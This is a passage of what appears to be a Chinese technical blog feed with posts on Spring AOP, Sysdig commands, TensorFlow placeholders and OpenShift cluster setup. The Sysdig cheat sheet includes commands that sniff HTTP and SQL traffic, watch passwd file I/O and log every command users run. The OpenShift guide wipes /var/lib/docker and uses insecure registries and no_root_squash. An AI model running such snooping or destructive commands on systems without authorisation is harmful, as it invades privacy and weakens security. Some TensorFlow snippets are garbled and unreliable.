<p>我们以系统中常用到的事务管控举例子。在系统操作数据库的过程中，不可避免地要考虑到事务相关的内容。如果在每一个方法中都新建一个事务管理器，那么无疑是对代码严重的耦合和侵入。为了简化我们的开发过程（实际上spring所做的一切实现都是为了简化开发过程），需要把事务相关的代码抽成出来做为一个独立的模块。通过AOP，确认每一个操作数据库方法为一个连接点，这些连接点组成了一个切面。当程序运行到其中某个一个切点时，我们将事务管理模块顺势织入对象中，通过通知功能，完成整个事务管控的实现。这样一来，所有的操作数据库的方法中不需要再单独关心事务管理的内容，只需要关注自身的业务代码的实现即可。所有的事务管控相关的内容都通过AOP的方式进行了实现。简化了代码的内容，将目标对象复杂的内容进行解耦，分离业务逻辑与横切关注点。</p>
</blockquote>
<p>下面介绍一下AOP相关的术语：</p>
<ul>
<li>通知： 通知定义了切面是什么以及何时使用的概念。Spring 切面可以应用5种类型的通知：</li>
</ul>
<ul>
<li><p>前置通知（Before）：在目标方法被调用之前调用通知功能。</p>
</li>
<li><p>后置通知（After）：在目标方法完成之后调用通知，此时不会关心方法的输出是什么。</p>
</li>
<li><p>返回通知（After-returning）：在目标方法成功执行之后调用通知。</p>
</li>
<li><p>异常通知（After-throwing）：在目标方法抛出异常后调用通知。</p>
</li>
<li><p>环绕通知（Around）：通知包裹了被通知的方法，在被通知的方法调用之前和调用之后执行自定义的行为。</p>
</li>
</ul>
<ul>
<li><p>连接点：是在应用执行过程中能够插入切面的一个点。</p>
</li>
<li><p>切点： 切点定义了切面在何处要织入的一个或者多个连接点。</p>
</li>
<li><p>切面：是通知和切点的结合。通知和切点共同定义了切面的全部内容。</p>
</li>
<li><p>引入：引入允许我们向现有类添加新方法或属性。</p>
</li>
<li><p>织入：是把切面应用到目标对象，并创建新的代理对象的过程。切面在指定的连接点被织入到目标对象中。在目标对象的生命周期中有多个点可以进行织入：   </p>
</li>
</ul>
<ul>
<li><p>编译期： 在目标类编译时，切面被织入。这种方式需要特殊的编译器。AspectJ的织入编译器就是以这种方式织入切面的。</p>
</li>
<li><p>类加载期：切面在目标加载到JVM时被织入。这种方式需要特殊的类加载器(class loader)它可以在目标类被引入应用之前增强该目标类的字节码。</p>
</li>
<li><p>运行期： 切面在应用运行到某个时刻时被织入。一般情况下，在织入切面时，AOP容器会为目标对象动态地创建一个代理对象。SpringAOP就是以这种方式织入切面的。</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Sysdig-项目</title>
    <url>/2022/08/31/Sysdig-%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<hr>
<p>title: Sysdig 项目<br>date: 2021-01-26 19:17:46<br>tags: Linux</p>
<hr>
<p>sysdig相当于strace + tcpdump + lsof + htop + iftop 以及其他工具的合集 ，除此之外其还能对容器如docker、coreOS、LXC进行监控，收集了一些用法，具体可以参考<a href="https://blog.csdn.net/vic_qxz/article/details/107761255?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-3.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-3.control" target="_blank" rel="noopener">这里</a></p>
<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>sysdig 通过在内核的 driver 模块注册系统调用的 hook，这样当有系统调用发生和完成的时候，它会把系统调用信息拷贝到特定的 buffer，然后用户模块的组件对数据信息处理（解压、解析、过滤等），并最终通过 sysdig 命令行和用户进行交互。如下图所示：<br> <img src="/2022/08/31/Sysdig-%E9%A1%B9%E7%9B%AE/1.png" alt="avatar"></p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ol>
<li><p>网络<br> 查看占用网络带宽最多的进程：</p>
<p> sysdig -c topprocs_net</p>
<p> 显示主机192.168.0.1的网络传输数据：</p>
<p> sysdig -s2000 -X -c echo_fds fd.cip=192.168.0.1</p>
<p> 这里显示网络传输功能，实际效果和tcpdump抓包是一样的。而且其本身也支持sysdig -w dump.scap抓包保存（可以配置-X或-A使用），抓好包也支持sysdir -r dump.scap读取。</p>
<p> 查看连接最多的服务器端口：</p>
<p> in terms of established connections:</p>
<p> sysdig -c fdcount_by fd.sport “evt.type=accept”</p>
<p> in terms of total bytes:</p>
<p> sysdig -c fdbytes_by fd.sport</p>
<p> 查看客户端连接最多的ip：</p>
<p> in terms of established connections</p>
<p> sysdig -c fdcount_by fd.cip “evt.type=accept”</p>
<p> in terms of total bytes</p>
<p> sysdig -c fdbytes_by fd.cip</p>
<p> 列出所有不是访问apache服务的访问连接：</p>
<p> sysdig -p”%proc.name %fd.name” “evt.type=accept and proc.name!=httpd”</p>
</li>
<li><p>硬盘 I/O</p>
<p> 查看使用硬盘带宽最多的进程：</p>
<p> sysdig -c topprocs_file</p>
<p> 列出使用大量文件描述符的进程</p>
<p> sysdig -c fdcount_by proc.name “fd.type=file”</p>
<p> See the top files in terms of read+write bytes</p>
<p> sysdig -c topfiles_bytes</p>
<p> Print the top files that apache has been reading from or writing to</p>
<p> sysdig -c topfiles_bytes proc.name=httpd</p>
<p> Basic opensnoop: snoop file opens as they occur</p>
<p> sysdig -p “%12user.name %6proc.pid %12proc.name %3fd.num %fd.typechar %fd.name” evt.type=open</p>
<p> See the top directories in terms of R+W disk activity</p>
<p> sysdig -c fdbytes_by fd.directory “fd.type=file”</p>
<p> See the top files in terms of R+W disk activity in the /tmp directory</p>
<p> sysdig -c fdbytes_by fd.filename “fd.directory=/tmp/“</p>
<p> Observe the I/O activity on all the files named ‘passwd’</p>
<p> sysdig -A -c echo_fds “fd.filename=passwd”</p>
<p> Display I/O activity by FD type</p>
<p> sysdig -c fdbytes_by fd.type</p>
</li>
<li><p>进程和CPU使用率</p>
<p> See the top processes in terms of CPU usage</p>
<p> sysdig -c topprocs_cpu</p>
<p> See the top processes for CPU 0</p>
<p> sysdig -c topprocs_cpu evt.cpu=0</p>
<p> Observe the standard output of a process</p>
<p> sysdig -s4096 -A -c stdout proc.name=cat</p>
</li>
</ol>
<p>4、应用</p>
<pre><code>查看机器所有的HTTP请求

sudo sysdig -s 2000 -A -c echo_fds fd.port=80 and evt.buffer contains GET

查看机器所有的SQL select查询

sudo sysdig -s 2000 -A -c echo_fds evt.buffer contains SELECT

See queries made via apache to an external MySQL server happening in real time

sysdig -s 2000 -A -c echo_fds fd.sip=192.168.30.5 and proc.name=apache2 and evt.buffer contains SELECT</code></pre>
<ol start="5">
<li><p>性能和错误</p>
<p> See the files where most time has been spent</p>
<p> sysdig -c topfiles_time</p>
<p> See the files where apache spent most time</p>
<p> sysdig -c topfiles_time proc.name=httpd</p>
<p> See the top processes in terms of I/O errors</p>
<p> sysdig -c topprocs_errors</p>
<p> See the top files in terms of I/O errors</p>
<p> sysdig -c topfiles_errors</p>
<p> See all the failed disk I/O calls</p>
<p> sysdig fd.type=file and evt.failed=true</p>
<p> See all the failed file opens by httpd</p>
<p> sysdig “proc.name=httpd and evt.type=open and evt.failed=true”</p>
<p> See the system calls where most time has been spent</p>
<p> sysdig -c topscalls_time</p>
<p> See the top system calls returning errors</p>
<p> sysdig -c topscalls “evt.failed=true”</p>
<p> snoop failed file opens as they occur</p>
<p> sysdig -p “%12user.name %6proc.pid %12proc.name %3fd.num %fd.typechar %fd.name” evt.type=open and evt.failed=true</p>
<p> Print the file I/O calls that have a latency greater than 1ms:</p>
<p> sysdig -c fileslower 1</p>
</li>
<li><p>安全</p>
<p> Show the directories that the user “root” visits</p>
<p> sysdig -p”%evt.arg.path” “evt.type=chdir and user.name=root”</p>
<p> Observe ssh activity</p>
<p> sysdig -A -c echo_fds fd.name=/dev/pretmx and proc.name=sshd</p>
<p> Show every file open that happens in /etc</p>
<p> sysdig evt.type=open and fd.name contains /etc</p>
<p> Show the ID of all the login shells that have launched the “tar” command</p>
<p> sysdig -r file.scap -c list_login_shells tar</p>
<p> Show all the commands executed by the login shell with the given ID</p>
<p> sysdig -r trace.scap.gz -c spy_users proc.loginshellid=5459</p>
</li>
<li><p>容器</p>
<p> 查看机器上运行的容器列表及其资源使用情况</p>
<p> sudo csysdig -vcontainers</p>
<p> 查看容器上下文的进程列表</p>
<p> sudo csysdig -pc</p>
<p> 查看运行在wordpress1容器里CPU的使用率</p>
<p> sudo sysdig -pc -c topprocs_cpu container.name=wordpress1</p>
<p> 查看运行在wordpress1容器里网络带宽的使用率</p>
<p> sudo sysdig -pc -c topprocs_net container.name=wordpress1</p>
<p> 查看在wordpress1容器里使用网络带宽最多的进程</p>
<p> sudo sysdig -pc -c topprocs_net container.name=wordpress1</p>
<p> 查看在wordpress1 容器里占用 I/O 字节最多的文件</p>
<p> sudo sysdig -pc -c topfiles_bytes container.name=wordpress1</p>
<p> 查看在wordpress1 容器里网络连接的排名情况</p>
<p> sudo sysdig -pc -c topconns container.name=wordpress1</p>
<p> 显示wordpress1容器里所有命令执行的情况</p>
<p> sudo sysdig -pc -c spy_users container.name=wordpress1</p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Tensorflow中的placeholder和feed_dict</title>
    <url>/2020/09/15/Tensorflow%E4%B8%AD%E7%9A%84placeholder%E5%92%8Cfeed-dict/</url>
    <content><![CDATA[<p>TensorFlow 支持占位符placeholder。占位符并没有初始值，它只会分配必要的内存。在会话中，占位符可以使用 feed_dict 馈送数据。 feed_dict是一个字典，在字典中需要给出每一个用到的占位符的取值。 在训练神经网络时需要每次提供一个批量的训练样本，如果每次迭代选取的数据要通过常量表示，那么TensorFlow 的计算图会非常大。因为每增加一个常量，TensorFlow 都会在计算图中增加一个结点。所以说拥有几百万次迭代的神经网络会拥有极其庞大的计算图，而占位符却可以解决这一点，它只会拥有占位符这一个结点。 placeholder函数的定义为 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tf.placeholder(dtype, shape&#x3D;None, name&#x3D;None)&#96;</span><br></pre></td></tr></table></figure>
<p>参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dtype：数据类型。常用的是tf.int32，tf.float32，tf.float64，tf.string等数据类型。 </span><br><span class="line">shape：数据形状。默认是None，也就是一维值。 也可以表示多维，比如要表示2行3列则应设为[2, 3]。 形如[None, 3]表示列是3，行不定。 </span><br><span class="line">name：名称。 返回：Tensor类型&#96;</span><br></pre></td></tr></table></figure>
<p> ##例1<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import tensorflow as tf </span><br><span class="line">x &#x3D; tf.placeholder(tf.string) </span><br><span class="line">with tf.Session() as sess: </span><br><span class="line">  output &#x3D; sess.run(x, feed_dict&#x3D;&#123;x: &#39;Hello World&#39;&#125;) </span><br><span class="line">  print(output)</span><br><span class="line">  &#96;</span><br></pre></td></tr></table></figure><br> 运行结果：<br>    <code>Hello World</code><br>##例2 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import tensorflow as tf </span><br><span class="line">x &#x3D; tf.placeholder(tf.string) </span><br><span class="line">y &#x3D; tf.placeholder(tf.int32) </span><br><span class="line">z &#x3D; tf.placeholder(tf.float32) </span><br><span class="line">with tf.Session() as sess: </span><br><span class="line">  output &#x3D; sess.run(x, feed_dict &#x3D; &#123;x :&#39;Hello World&#39;, y:123, z:45.67&#125;) </span><br><span class="line">  print(output) </span><br><span class="line">  output &#x3D; sess.run(y, feed_dict &#x3D; &#123;x :&#39;Hello World&#39;, y:123, z:45.67&#125;) </span><br><span class="line">  print(output) </span><br><span class="line">  output &#x3D; sess.run(z, feed_dict &#x3D; &#123;x :&#39;Hello World&#39;, y:123, z:45.67&#125;) </span><br><span class="line">  print(output) </span><br><span class="line">&#96;&#96;&#96;&#96;  </span><br><span class="line"> 运行结果：</span><br></pre></td></tr></table></figure>
<p>  Hello Word 123 45.66999816894531`<br>  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">##例3：</span><br></pre></td></tr></table></figure><br> import tensorflow as tf<br> import numpy as np<br> x = tf.placeholder(tf.float32, shape=(3, 3))<br> y = tf.matmul(x, x) with tf.Session() as sess:<br>   rand_array = np.random.rand(3, 3)<br>   print(sess.run(y, feed_dict = {x: rand_array}))</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">运行结果：</span><br><span class="line">&#96;&#96;&#96;&#96; </span><br><span class="line">\[\[0.62475741 0.40487182 0.5968855 \] </span><br><span class="line">\[0.17491265 0.08546661 0.23616122\] </span><br><span class="line">\[0.53931886 0.24997233 0.56168258\]\]\</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>OpenShift基础功能测试和验证</title>
    <url>/2020/09/21/OpenShift%E5%9F%BA%E7%A1%80%E5%8A%9F%E8%83%BD%E6%B5%8B%E8%AF%95%E5%92%8C%E9%AA%8C%E8%AF%81/</url>
    <content><![CDATA[<h1 id="OpenShift"><a href="#OpenShift" class="headerlink" title="OpenShift"></a>OpenShift</h1><h2 id="OpenShift-分布式部署"><a href="#OpenShift-分布式部署" class="headerlink" title="OpenShift 分布式部署"></a>OpenShift 分布式部署</h2><h3 id="OpenShift-Slave节点配置"><a href="#OpenShift-Slave节点配置" class="headerlink" title="OpenShift Slave节点配置"></a>OpenShift Slave节点配置</h3><p>0、 节点ssh互信设置</p>
<p>Maste节点执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line"># for host in master.example.com \\</span><br><span class="line">    node1.example.com \\</span><br><span class="line">    node2.example.com; \\</span><br><span class="line">    do ssh-copy-id -i ~&#x2F;.ssh&#x2F;id\_rsa.pub $host; \\</span><br><span class="line">    done</span><br></pre></td></tr></table></figure>

<p>1、 每个节点都需要安装docker，手动安装</p>
<p>2、设置每个节点的docker 存储，使用数据盘做为docker的存储</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\[root@origin-master member\]# cat &#x2F;etc&#x2F;sysconfig&#x2F;docker-storage-setup</span><br><span class="line"> Edit this file to override any configuration options specified in</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;docker-storage-setup&#x2F;docker-storage-setup.</span><br><span class="line"></span><br><span class="line">For more details refer to &quot;man docker-storage-setup&quot;</span><br><span class="line">DEVS&#x3D;&#x2F;dev&#x2F;vdb</span><br><span class="line">VG&#x3D;docker-vg</span><br><span class="line"> </span><br><span class="line">docker-storage-setup</span><br><span class="line"> </span><br><span class="line">systemctl stop docker</span><br><span class="line">rm -rf &#x2F;var&#x2F;lib&#x2F;docker&#x2F;\*</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>

<p>3、</p>
<p>设置每个节点的docker 可信镜像地址/etc/sysconfig/docker（这一操作，可以在部署完成openshift后，进行修改，其中172.30.0.0/16为ansible配置，10.110.17.138:5000为外部的docker镜像源）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OPTIONS&#x3D;&#39;--insecure-registry&#x3D;10.110.17.138:5000 --insecure-registry&#x3D;172.30.0.0&#x2F;16    &#39;</span><br></pre></td></tr></table></figure>





<p>4、在DNS为每个Node的配置</p>
<p> A记录参考配置:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@origin-dns:&#x2F;etc&#x2F;bind# cat &#x2F;etc&#x2F;bind&#x2F;named.conf.local</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; Do any local configuration here</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; Consider adding the 1918 zones here, if they are not used in your</span><br><span class="line">&#x2F;&#x2F; organization</span><br><span class="line">&#x2F;&#x2F;include &quot;&#x2F;etc&#x2F;bind&#x2F;zones.rfc1918&quot;;</span><br><span class="line">zone &quot;novalocal&quot; &#123;</span><br><span class="line">        type master;</span><br><span class="line">        file &quot;&#x2F;etc&#x2F;bind&#x2F;db.novalocal&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">root@origin-dns:&#x2F;etc&#x2F;bind# cat db.novalocal</span><br><span class="line">$TTL    604800</span><br><span class="line">@       IN      SOA     novalocal. root.novalocal. (</span><br><span class="line">                              1         ; Serial</span><br><span class="line">                         604800         ; Refresh</span><br><span class="line">                          86400         ; Retry</span><br><span class="line">                        2419200         ; Expire</span><br><span class="line">                          86400 )       ; Negative Cache TTL</span><br><span class="line">;</span><br><span class="line">@       IN      NS      novalocal.</span><br><span class="line">@       IN      A       192.168.10.143</span><br><span class="line">origin-master  IN      A       192.168.10.143</span><br><span class="line">origin-slave1  IN      A       192.168.10.149</span><br><span class="line">origin-slave2  IN      A       192.168.10.145</span><br><span class="line">origin-slave3  IN      A       192.168.10.147</span><br></pre></td></tr></table></figure>



<h3 id="OpenShift-Master节点配置"><a href="#OpenShift-Master节点配置" class="headerlink" title="OpenShift Master节点配置"></a>OpenShift Master节点配置</h3><p>1、ansible-openshift 的配置文件/etc/ansible/hosts 增加一下配置，完成OpenShift节点的定义</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[OSEv3:children]</span><br><span class="line">masters</span><br><span class="line">nodes</span><br><span class="line">[OSEv3:vars]</span><br><span class="line">ansible_ssh_user&#x3D;root</span><br><span class="line">deployment_type&#x3D;origin</span><br><span class="line">openshift\_master\_identity\_providers&#x3D;\[&#123;&#39;name&#39;: &#39;htpasswd\_auth&#39;, &#39;login&#39;: &#39;true&#39;, &#39;challenge&#39;: &#39;true&#39;, &#39;kind&#39;: &#39;HTPasswdPasswordIdentityProvider&#39;, &#39;filename&#39;: &#39;&#x2F;etc&#x2F;origin&#x2F;htpasswd&#39;&#125;\]</span><br><span class="line">os\_sdn\_network\_plugin\_name&#x3D;redhat&#x2F;openshift-ovs-multitenant</span><br><span class="line">openshift\_master\_portal\_net&#x3D;172.30.0.0&#x2F;16</span><br><span class="line">openshift\_master\_session\_name&#x3D;ssn</span><br><span class="line">openshift\_master\_session\_max\_seconds&#x3D;3600</span><br><span class="line">openshift\_master\_session\_auth\_secrets&#x3D;\[&#39;DONT+USE+THIS+SECRET+b4NV+pmZNSO&#39;\]</span><br><span class="line">openshift\_master\_session\_encryption\_secrets&#x3D;\[&#39;DONT+USE+THIS+SECRET+b4NV+pmZNSO&#39;\]</span><br><span class="line"> </span><br><span class="line">\[masters\]</span><br><span class="line">origin-master.novalocal openshift\_public\_ip&#x3D;10.110.17.139 openshift\_public\_hostname&#x3D;origin-master.novalocal</span><br><span class="line">\[nodes\]</span><br><span class="line">origin-slave1.novalocal openshift\_node\_labels&#x3D;&quot;&#123;&#39;region&#39;: &#39;primary&#39;, &#39;zone&#39;: &#39;east&#39;&#125;&quot;</span><br><span class="line">origin-slave2.novalocal openshift\_node\_labels&#x3D;&quot;&#123;&#39;region&#39;: &#39;primary&#39;, &#39;zone&#39;: &#39;east&#39;&#125;&quot;</span><br><span class="line">origin-slave3.novalocal openshift\_node\_labels&#x3D;&quot;&#123;&#39;region&#39;: &#39;primary&#39;, &#39;zone&#39;: &#39;east&#39;&#125;&quot;</span><br><span class="line">origin-master.novalocal openshift\_node\_labels&#x3D;&quot;&#123;&#39;region&#39;:&#39;infra&#39;,&#39;zone&#39;:&#39;default&#39;&#125;&quot; openshift\_schedulable&#x3D;false</span><br></pre></td></tr></table></figure>



<p>2、</p>
<p>搭建NFS服务器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\[root@oc-master ~\]yum install nfs-utils</span><br><span class="line">\[root@oc-master ~\]cat &#x2F;etc&#x2F;exports</span><br><span class="line">&#x2F;opt&#x2F;docker-registry 192.168.10.0&#x2F;24(rw,sync,no\_root\_squash,no\_all\_squash)</span><br><span class="line">&#96;&#96;&#96;&#96; </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">配置服务端访问策略：</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;&#96;(python)</span><br><span class="line">cat  &#x2F;etc&#x2F;sysconfig&#x2F;iptables</span><br><span class="line">-A OS\_FIREWALL\_ALLOW -m state --state NEW  -p udp -s 192.168.10.0&#x2F;24 --dport 111 -j ACCEPT</span><br><span class="line">-A OS\_FIREWALL\_ALLOW -m state --state NEW  -p tcp -s 192.168.10.0&#x2F;24 --dport 111 -j ACCEPT</span><br><span class="line">-A OS\_FIREWALL\_ALLOW -m state --state NEW  -p tcp -s 192.168.10.0&#x2F;24 --dport 20048 -j ACCEPT</span><br><span class="line">-A OS\_FIREWALL\_ALLOW -m state --state NEW  -p udp -s 192.168.6.0&#x2F;24 --dport 20048 -j ACCEPT</span><br><span class="line">-A OS\_FIREWALL\_ALLOW -m state --state NEW  -p udp -s 192.168.6.0&#x2F;24 --dport 2049 -j ACCEPT</span><br><span class="line">-A OS\_FIREWALL\_ALLOW -m state --state NEW  -p tcp -s 192.168.6.0&#x2F;24 --dport 2049 -j ACCEPT</span><br><span class="line">-A OS\_FIREWALL\_ALLOW -m state --state NEW  -p tcp -s 192.168.6.0&#x2F;24 --dport 20048 -j ACCEPT</span><br><span class="line">-A OS\_FIREWALL\_ALLOW -m state --state NEW  -p udp -s 192.168.6.0&#x2F;24 --dport 20048 -j ACCEPT</span><br><span class="line">-A OS\_FIREWALL\_ALLOW -m state --state NEW  -p udp -s 192.168.6.0&#x2F;24 --dport 49493 -j ACCEPT</span><br><span class="line">-A OS\_FIREWALL\_ALLOW -m state --state NEW  -p tcp -s 192.168.6.0&#x2F;24 --dport 49493 -j ACCEPT</span><br><span class="line">-A OS\_FIREWALL\_ALLOW -m state --state NEW  -p udp -s 192.168.6.0&#x2F;24 --dport 54932 -j ACCEPT</span><br><span class="line">-A OS\_FIREWALL\_ALLOW -m state --state NEW  -p tcp -s 192.168.6.0&#x2F;24 --dport 46120 -j ACCEPT</span><br><span class="line">-A OS\_FIREWALL\_ALLOW -m state --state NEW  -p udp -s 192.168.6.0&#x2F;24 --dport 37588 -j ACCEPT</span><br></pre></td></tr></table></figure>



<p>重启NFS服务 systemctl restart nfs-server.service</p>
<p>客户端挂载</p>
<p>mount -t nfs 192.168.6.7:/opt/docker-registry/ /opt/docker-registry/</p>
<h3 id="执行安装"><a href="#执行安装" class="headerlink" title="执行安装"></a>执行安装</h3><p>在master节点操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、执行安装：ansible-playbook ~&#x2F;openshift-ansible&#x2F;playbooks&#x2F;byo&#x2F;config.yml</span><br></pre></td></tr></table></figure>

<p>2、执行卸载：ansible-playbook openshift-ansible/playbooks/adhoc/uninstall.yml</p>
<h3 id="部署docker-Registry"><a href="#部署docker-Registry" class="headerlink" title="部署docker-Registry"></a>部署docker-Registry</h3><p>Master节点配置nfs</p>
<p>注意：部署完成docker-registry后，不能再讲该服务进行删除，因为服务地址已经更新到etcd，该地址目前看来，无法实时更新</p>
<p>在master节点操作</p>
<p>oadm registry –config=/etc/origin/master/admin.kubeconfig  –credentials=/etc/origin/master/openshift-registry.kubeconfig –service-account=registry  –mount-host=/opt/docker-registry</p>
<h3 id="部署监控metrics"><a href="#部署监控metrics" class="headerlink" title="部署监控metrics"></a>部署监控metrics</h3><p>1 使用 openshift-infra工程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">oc project openshift-infra</span><br></pre></td></tr></table></figure>
<p>2、</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">oc secrets new metrics-deployer nothing&#x3D;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<p>3、<br>oc process -f metrics-deployer.yaml -v HAWKULAR_METRICS_HOSTNAME=hawkular-metrics.devops.inspur,USE_PERSISTENT_STORAGE=false | oc create -f –</p>
<p>参考demo</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">#</span><br><span class="line"># Copyright 2014-2015 Red Hat, Inc. and&#x2F;or its affiliates</span><br><span class="line"># and other contributors as indicated by the @author tags.</span><br><span class="line">#</span><br><span class="line"># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="line"># you may not use this file except in compliance with the License.</span><br><span class="line"># You may obtain a copy of the License at</span><br><span class="line">#</span><br><span class="line">#    http:&#x2F;&#x2F;www.apache.org&#x2F;licenses&#x2F;LICENSE-2.0</span><br><span class="line">#</span><br><span class="line"># Unless required by applicable law or agreed to in writing, software</span><br><span class="line"># distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line"># See the License for the specific language governing permissions and</span><br><span class="line"># limitations under the License.</span><br><span class="line">#</span><br><span class="line"> </span><br><span class="line">apiVersion: &quot;v1&quot;</span><br><span class="line">kind: &quot;Template&quot;</span><br><span class="line">metadata:</span><br><span class="line">  name: metrics-deployer-template</span><br><span class="line">  annotations:</span><br><span class="line">    description: &quot;Template for deploying the required Metrics integration. Requires cluster-admin &#39;metrics-deployer&#39; service account and &#39;metrics-deployer&#39; secret.&quot;</span><br><span class="line">    tags: &quot;infrastructure&quot;</span><br><span class="line">labels:</span><br><span class="line">  metrics-infra: deployer</span><br><span class="line">  provider: openshift</span><br><span class="line">  component: deployer</span><br><span class="line">objects:</span><br><span class="line">-</span><br><span class="line">  apiVersion: v1</span><br><span class="line">  kind: Pod</span><br><span class="line">  metadata:</span><br><span class="line">    generateName: metrics-deployer-</span><br><span class="line">  spec:</span><br><span class="line">    containers:</span><br><span class="line">    - image: $&#123;IMAGE\_PREFIX&#125;metrics-deployer:$&#123;IMAGE\_VERSION&#125;</span><br><span class="line">      name: deployer</span><br><span class="line">      volumeMounts:</span><br><span class="line">      - name: secret</span><br><span class="line">        mountPath: &#x2F;secret</span><br><span class="line">        readOnly: true</span><br><span class="line">      - name: empty</span><br><span class="line">        mountPath: &#x2F;etc&#x2F;deploy</span><br><span class="line">      env:</span><br><span class="line">        - name: PROJECT</span><br><span class="line">          valueFrom:</span><br><span class="line">            fieldRef:</span><br><span class="line">              fieldPath: metadata.namespace</span><br><span class="line">        - name: IMAGE\_PREFIX</span><br><span class="line">          value: $&#123;IMAGE\_PREFIX&#125;</span><br><span class="line">        - name: IMAGE\_VERSION</span><br><span class="line">          value: $&#123;IMAGE\_VERSION&#125;</span><br><span class="line">        - name: MASTER\_URL</span><br><span class="line">          value: $&#123;MASTER\_URL&#125;</span><br><span class="line">        - name: REDEPLOY</span><br><span class="line">          value: $&#123;REDEPLOY&#125;</span><br><span class="line">        - name: USE\_PERSISTENT\_STORAGE</span><br><span class="line">          value: $&#123;USE\_PERSISTENT\_STORAGE&#125;</span><br><span class="line">        - name: HAWKULAR\_METRICS\_HOSTNAME</span><br><span class="line">          value: $&#123;HAWKULAR\_METRICS\_HOSTNAME&#125;</span><br><span class="line">        - name: CASSANDRA\_NODES</span><br><span class="line">          value: $&#123;CASSANDRA\_NODES&#125;</span><br><span class="line">        - name: CASSANDRA\_PV\_SIZE</span><br><span class="line">          value: $&#123;CASSANDRA\_PV\_SIZE&#125;</span><br><span class="line">        - name: METRIC\_DURATION</span><br><span class="line">          value: $&#123;METRIC\_DURATION&#125;</span><br><span class="line">    dnsPolicy: ClusterFirst</span><br><span class="line">    restartPolicy: Never</span><br><span class="line">    serviceAccount: metrics-deployer</span><br><span class="line">    volumes:</span><br><span class="line">    - name: empty</span><br><span class="line">      emptyDir: &#123;&#125;</span><br><span class="line">    - name: secret</span><br><span class="line">      secret:</span><br><span class="line">        secretName: metrics-deployer</span><br><span class="line">parameters:</span><br><span class="line">-</span><br><span class="line">  description: &#39;Specify prefix for metrics components; e.g. for &quot;openshift&#x2F;origin-metrics-deployer:latest&quot;, set prefix &quot;openshift&#x2F;origin-&quot;&#39;</span><br><span class="line">  name: IMAGE\_PREFIX</span><br><span class="line">  value: &quot;10.110.17.138:5000&#x2F;library&#x2F;origin-&quot;</span><br><span class="line">-</span><br><span class="line">  description: &#39;Specify version for metrics components; e.g. for &quot;openshift&#x2F;origin-metrics-deployer:latest&quot;, set version &quot;latest&quot;&#39;</span><br><span class="line">  name: IMAGE\_VERSION</span><br><span class="line">  value: &quot;latest&quot;</span><br><span class="line">-</span><br><span class="line">  description: &quot;Internal URL for the master, for authentication retrieval&quot;</span><br><span class="line">  name: MASTER\_URL</span><br><span class="line">  value: &quot;https:&#x2F;&#x2F;oc-master.novalocal:8443&quot;</span><br><span class="line">-</span><br><span class="line">  description: &quot;External hostname where clients will reach Hawkular Metrics&quot;</span><br><span class="line">  name: HAWKULAR\_METRICS\_HOSTNAME</span><br><span class="line">  required: true</span><br><span class="line">  value: &quot;hawkular-metrics.devops.inspur&quot;</span><br><span class="line">-</span><br><span class="line">  description: &quot;If set to true the deployer will try and delete all the existing components before trying to redeploy.&quot;</span><br><span class="line">  name: REDEPLOY</span><br><span class="line">  value: &quot;false&quot;</span><br><span class="line">-</span><br><span class="line">  description: &quot;Set to true for persistent storage, set to false to use non persistent storage&quot;</span><br><span class="line">  name: USE\_PERSISTENT\_STORAGE</span><br><span class="line">  value: &quot;false&quot;</span><br><span class="line">-</span><br><span class="line">  description: &quot;The number of Cassandra Nodes to deploy for the initial cluster&quot;</span><br><span class="line">  name: CASSANDRA\_NODES</span><br><span class="line">  value: &quot;1&quot;</span><br><span class="line">-</span><br><span class="line">  description: &quot;The persistent volume size for each of the Cassandra nodes&quot;</span><br><span class="line">  name: CASSANDRA\_PV\_SIZE</span><br><span class="line">  value: &quot;10Gi&quot;</span><br><span class="line">-</span><br><span class="line">  description: &quot;How many days metrics should be stored for.&quot;</span><br><span class="line">  name: METRIC\_DURATION</span><br><span class="line">  value: &quot;7&quot;</span><br></pre></td></tr></table></figure>



<p>当pod运行成功后，还需要修改/etc/origin/master/master-config.yaml文件，增加metric配置</p>
